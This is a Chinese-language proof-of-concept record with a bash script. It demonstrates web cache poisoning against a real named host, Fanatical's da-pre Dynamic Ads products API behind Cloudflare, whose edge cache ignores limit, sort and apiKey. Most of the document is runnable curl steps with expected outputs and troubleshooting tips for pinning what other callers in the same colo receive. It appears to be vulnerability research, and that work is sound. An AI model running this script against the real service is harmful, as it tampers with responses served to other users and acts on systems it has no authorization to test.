# Fanatical da-pre Dynamic Ads 商品 API：Cloudflare 边缘缓存键忽略 limit/sort/apiKey，单请求即可固定同 colo 全员商品条数与排序（Web Cache Poisoning）

- **code**: fanatical-da-pre-products-edge-cache-key-ignores-limit-sort
- **kind**: poc
- **category**: waf
- **component**: Fanatical Dynamic Ads / Affiliate Products API（Cloudflare Worker 前置 + Cloudflare 边缘缓存，da-pre 预发布；生产 da）
- **versions**: da-pre 预发布（无版本号）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=127（task#3，finding_checks.verdict=verified，status=confirmed）。2026-11-11 本机 Windows + curl（UA=$ARTEX_UA，经平台记录代理直连 da-pre.fanatical.com，--path-as-is）实测：① GET /api/v1/products.kkk?limit=1&cc=CA&h=&lt;uuid1&gt; → HTTP 200，7292 bytes，JSON 数组 1 条商品，cf-ray 后缀 LAX（首请求 MISS）；② 同路径 ?limit=20&cc=CA&h=&lt;uuid2&gt; → HTTP 200，7292 bytes，仍 1 条（预期 20 条），cf-cache-status: HIT；③ 同路径 ?limit=50&sort=price-low-to-high&cc=CA&h=&lt;uuid2&gt; → HTTP 200，137964 bytes，20 条，cf-cache-status: HIT，age: 2（不是请求指定的 50 条，也未按 price-low-to-high 重排）；④ GET /api/v1/products.zzz?apiKey=AAA&limit=1&cc=JP&h=&lt;uuid3&gt; → 200，1 条；⑤ 同路径 ?limit=3&cc=JP&z=&lt;uuid4&gt;（无 apiKey）→ 200，命中④同一条目（1 条），cf-cache-status: HIT；⑥ 对照生产 GET https://da.fanatical.com/api/v1/products（含 .json/.zzz/.. 等 10 路径 × 3 次）→ 全部 HTTP 401、24 bytes {"error":"Unauthorized"}、无 cf-cache-status。判定成立依据：同路径第二次请求 HIT 且 bytes/条数与首请求完全一致而 limit 已变化 → limit 不在缓存键；sort 请求命中既有 20 条条目 → sort 不生效；带/不带 apiKey 命中同一条目 → apiKey 不在键；响应自身 Cache-Control: no-store 仍被边缘缓存。影响限于预发布公开目录数据（low），生产 da 401 未被缓存，未构成生产鉴权绕过。
- **path**: pocs/fanatical-da-pre-products-edge-cache-key-ignores-limit-sort/fanatical_da-pre_products_cache_poison.sh
- **tags**: fanatical,da-pre,cloudflare,web-cache-poisoning,cache-key,cf-cache-status,limit,sort,apikey,预发布,商品api
- **created_at**: 2026-11-11T17:27:24.069Z
- **engine**: https://da-pre.fanatical.com

## 描述

Cloudflare 边缘缓存对 da-pre 的 /api/v1/products 路由只按字面路径建键，query 里的 limit、sort、apiKey 及未知参数（h/z）都不参与缓存键，且忽略源响应自身的 Cache-Control: no-store（仍返回 cf-cache-status: HIT + age）。任一无鉴权请求可用首个请求把某 colo 下该路径缓存成任意商品条数/排序，随后同 colo 所有调用者（含联盟广告前端）都会拿到被固定的响应：实测 limit=20 命中 limit=1 的 1 条缓存，limit=50&sort=price-low-to-high 命中 20 条缓存。前提：da-pre 预发布匿名可达（同端点另有 apiKey 未校验）、浏览器类 UA、同一 cf-ray colo；不同 colo 缓存独立。影响为预发布公开目录内容的单请求固定/错误投放，评 low；生产 da 同路由 401 未被缓存。

## 用法

```
前置：da-pre.fanatical.com 公网可达（x-is-cf-worker: 1），无需凭据；UA 用浏览器类（$ARTEX_UA）；同一 cf-ray colo 内测试（看 cf-ray 后缀）；每个字面路径（含 .kkk/.zzz/.json/.foo 等后缀变体）是独立缓存槽，Worker 剥离后缀交给同一路由。

1) 基线：GET /api/v1/products（匿名 200，20 条）；对照生产 GET https://da.fanatical.com/api/v1/products → 401 24B、无 cf-cache-status。
2) 用一个未请求过的后缀变体建条目：GET /api/v1/products.kkk?limit=1&cc=CA&h=<uuid1> → 期望 200、约 7292B、1 条，cf-cache-status: MISS。
3) 同路径换 limit=20（换 h）→ 期望 cf-cache-status: HIT 且仍 1 条、字节数与 step2 一致（limit 不在键）。
4) 同路径加 sort=price-low-to-high&limit=50 → 期望 HIT 既有条目（实测 20 条、137964B、age:2），不按请求的 50/排序返回（sort 不在键）。
5) 换另一个新后缀 .zzz：带 apiKey=AAA&limit=1 建 1 条条目；再不带 apiKey、limit=3、换未知参数 z → 期望 HIT 同一条目（apiKey/limit/未知参数均不在键）。
判据：同一路径第二次请求 cf-cache-status: HIT，且条数/字节数与首请求完全一致，而 query 语义已变化。失败常见原因：a) 用了已缓存的路径 → 直接 HIT 旧条目，换未用过的后缀变体；b) 跨 colo（cf-ray 后缀变化）→ 各 colo 独立缓存；c) 裸 curl UA 被边缘拦；d) 把 Cache-Control: no-store 当成不缓存（本边缘忽略它）；e) 把生产 da 的 401 当投毒面（实测未缓存）。
```

## 正文

```
#!/usr/bin/env bash
# Fanatical da-pre Dynamic Ads Products API — Cloudflare 边缘缓存键忽略 limit/sort/apiKey（Web Cache Poisoning）
# 目标: https://da-pre.fanatical.com（Cloudflare Worker 前置, x-is-cf-worker: 1；生产 da.fanatical.com 同路由需鉴权）
# 同端点背景: da-pre 预发布未校验 apiKey, 匿名即可读商品 JSON。
# 本脚本: 证明边缘缓存按字面路径建键, query 的 limit/sort/apiKey/未知参数都不参与。

# 前置:
#   - 公网可达, 无需 Cookie / Authorization / apiKey
#   - 浏览器类 UA（裸 curl UA 可能被边缘拦）
#   - 同一 Cloudflare colo（看响应头 cf-ray 后缀, 例如 ...-LAX）；不同 colo 缓存独立
#   - 每个字面路径是独立缓存槽: /api/v1/products、/api/v1/products.kkk、.zzz、.json、.foo ……
#     Worker 会剥离后缀交给同一路由, 但边缘按字面 path 建键
#
# 判据（缺一不可）:
#   1) 未用过的路径变体首请求: cf-cache-status: MISS（或无该头）
#   2) 同路径换 limit 再请求: HIT 且 bytes/条数与首请求完全一致（limit 不在键）
#   3) 带 sort=price-low-to-high 仍返回既有条目（不重排）（sort 不在键）
#   4) 带/不带 apiKey 命中同一条目（apiKey 不在键）
#   5) 换未知参数 h/z 仍 HIT（未知参数不在键）
#   6) 响应自身 Cache-Control 可能是 no-store —— 边缘仍缓存, 必须二次请求看 cf-cache-status
#   7) 对照生产 da: 401 且无 cf-cache-status（不构成生产鉴权绕过）
#
# 失败常见原因:
#   a) 用了别人已缓存的路径 → 直接 HIT 旧条目, 换一个未用过的后缀变体
#   b) 跨 colo（cf-ray 后缀变了）→ 各 colo 独立缓存, 会 MISS
#   c) 裸 curl UA 被边缘 403/拦 → 换浏览器 UA
#   d) 只看 Cache-Control: no-store 就判「不可投毒」→ 假阴性
#   e) 把生产 da 的 401 当投毒面 → 实测生产 401 未被缓存

set -u
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36}"
HOST="da-pre.fanatical.com"
PROD="da.fanatical.com"
OUT="$(mktemp -d)"

uuid() { python3 -c 'import uuid;print(uuid.uuid4().hex[:12])' 2>/dev/null || echo "$RANDOM$RANDOM"; }
hdr()  { grep -iE '^(HTTP/|cf-cache-status:|age:|cache-control:|cf-ray:|x-is-cf-worker:)' "$1" | tr -d '\r'; }
cnt()  { python3 -c 'import json,sys;d=json.load(open(sys.argv[1]));print(len(d) if isinstance(d,list) else "non-list")' "$1"; }

# ---------- 0) 基线: da-pre 匿名 200; 生产 da 401 且无缓存头 ----------
curl -sk -A "$UA" -D "$OUT/h0.txt" -o "$OUT/r0.json" "https://$HOST/api/v1/products"
hdr "$OUT/h0.txt"; echo "pre items=$(cnt "$OUT/r0.json") bytes=$(wc -c <"$OUT/r0.json")"
curl -sk -A "$UA" -D "$OUT/hp.txt" -o "$OUT/rp.json" "https://$PROD/api/v1/products"
hdr "$OUT/hp.txt"; echo "prod bytes=$(wc -c <"$OUT/rp.json") body=$(cat "$OUT/rp.json")"
# 期望: pre 200（20 条左右）；prod HTTP 401、24 bytes {"error":"Unauthorized"}、无 cf-cache-status

# ---------- 1) 用新后缀变体建「1 条」缓存条目 ----------
V1=".kkk"   # 换成从未请求过的后缀; 若这里已经是 HIT, 换 .json/.foo/.zzz 等其他变体
U1="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h1.txt" -o "$OUT/r1.json" \
  "https://$HOST/api/v1/products$V1?limit=1&cc=CA&h=$U1"
hdr "$OUT/h1.txt"; echo "step1 items=$(cnt "$OUT/r1.json") bytes=$(wc -c <"$OUT/r1.json")"
# 期望: HTTP 200、约 7292 bytes、1 条商品、cf-cache-status: MISS（或无该头）

# ---------- 2) 同路径换 limit=20 → 仍拿到首请求固定的 1 条 ----------
U2="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h2.txt" -o "$OUT/r2.json" \
  "https://$HOST/api/v1/products$V1?limit=20&cc=CA&h=$U2"
hdr "$OUT/h2.txt"; echo "step2 items=$(cnt "$OUT/r2.json") bytes=$(wc -c <"$OUT/r2.json")"
# 期望: cf-cache-status: HIT, items=1, bytes 与 step1 完全一致（实测 7292B）
# 若 items=20 → limit 在该 colo 的缓存键里, 本条不成立（先检查 cf-ray 是否同 colo）

# ---------- 3) 同路径 limit=50&sort=price-low-to-high → 命中既有条目（sort 不生效） ----------
curl -sk -A "$UA" --path-as-is -D "$OUT/h3.txt" -o "$OUT/r3.json" \
  "https://$HOST/api/v1/products$V1?limit=50&sort=price-low-to-high&cc=CA&h=$U2"
hdr "$OUT/h3.txt"; echo "step3 items=$(cnt "$OUT/r3.json") bytes=$(wc -c <"$OUT/r3.json")"
# 实测: HIT 既有 20 条条目（137964 bytes, age: 2）, 不是本请求指定的 50 条, 也未按 price-low-to-high 重排
# → 返回内容由该路径当前缓存条目决定, query 语义被忽略

# ---------- 4) apiKey 不在缓存键: 换另一个新后缀建 1 条条目 ----------
V2=".zzz"
U3="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h4.txt" -o "$OUT/r4.json" \
  "https://$HOST/api/v1/products$V2?apiKey=AAA&limit=1&cc=JP&h=$U3"
hdr "$OUT/h4.txt"; echo "step4 items=$(cnt "$OUT/r4.json") bytes=$(wc -c <"$OUT/r4.json")"

# ---------- 5) 不带 apiKey、不同 limit、换未知参数 → 命中同一条目 ----------
U4="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h5.txt" -o "$OUT/r5.json" \
  "https://$HOST/api/v1/products$V2?limit=3&cc=JP&z=$U4"
hdr "$OUT/h5.txt"; echo "step5 items=$(cnt "$OUT/r5.json") bytes=$(wc -c <"$OUT/r5.json")"
# 期望: HIT 且 items=1（与 step4 同一条目）→ apiKey / limit / 未知 z 均不在缓存键

# ---------- 6) 生产对照（可重复多次, 含 .json/.zzz 等变体） ----------
for p in "/api/v1/products" "/api/v1/products.json" "/api/v1/products.zzz"; do
  curl -sk -A "$UA" --path-as-is -D "$OUT/hpc.txt" -o "$OUT/rpc.txt" "https://$PROD$p"
  echo "prod $p -> $(grep -iE '^HTTP/' "$OUT/hpc.txt" | tail -1 | tr -d '\r') bytes=$(wc -c <"$OUT/rpc.txt") $(grep -i 'cf-cache-status' "$OUT/hpc.txt" | tr -d '\r')"
done
# 期望: 全部 401 24B、无 cf-cache-status → 生产侧未观察到缓存 200, 不构成生产鉴权绕过

echo "[i] 原始响应目录: $OUT"
```
